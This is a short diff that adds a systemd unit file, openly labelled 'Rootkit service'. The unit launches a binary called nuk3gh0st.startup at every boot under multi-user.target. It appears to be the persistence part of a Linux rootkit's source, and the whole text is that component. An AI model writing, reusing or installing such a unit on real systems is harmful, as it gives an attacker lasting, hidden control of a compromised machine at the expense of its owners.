@@ -1,0 +1,8 @@
+[Unit]
+Description=Rootkit service
+
+[Service]
+ExecStart=/usr/lib/nuk3gh0st.startup
+
+[Install]
+WantedBy=multi-user.target
